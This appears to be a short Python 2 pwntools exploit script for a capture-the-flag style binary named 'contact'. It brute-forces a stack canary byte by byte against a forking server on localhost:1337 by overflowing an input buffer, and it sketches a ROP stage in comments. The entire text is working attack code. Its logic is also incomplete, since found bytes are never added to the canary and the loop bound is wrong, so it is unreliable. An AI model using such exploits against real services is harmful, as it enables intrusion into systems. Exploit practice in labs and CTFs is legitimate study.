from pwn import *
#libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/libc.so.6")
elf = ELF("./contact")
#stage 1: bruteforce canary since is child of parent
CANARY = ""
TIMEOUT = 10
context.log_level = 'debug'
requests = []
log.warn("Starting")
#def do_rop(rop):
#    payload = "A" * 56
#    payload += Canary
def server_is_dead(attempt,srv):
    resp = srv.clean(timeout=TIMEOUT)
    requests.append(attempt)
    log.warn(resp)
    if "ne" not in resp: 
        srv.close()
        return 1

pattern = "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa"
log.info("starting")
while len(CANARY) < 100:
    for attempt in map(chr, range(0x100)):
        if attempt == "\n":  # we can't send \n
            continue
        log.warn("Trying %s" %(attempt))
        srv = remote("localhost",1337)
        srv.recvuntil("admin:")
        srv.sendline("A" * 40 + CANARY +attempt)
        log.warn(srv.recv(1024))
        a =srv.recv(1024)
        log.warn("RECEIVED: %s",a)
        if "ne" in a:
            log.warn("FOUND Canary %d/8" % len(CANARY))
            break
        else:
            pass

        if attempt == "\xff":
            print requests
            log.error("Failed to leak canary :(")
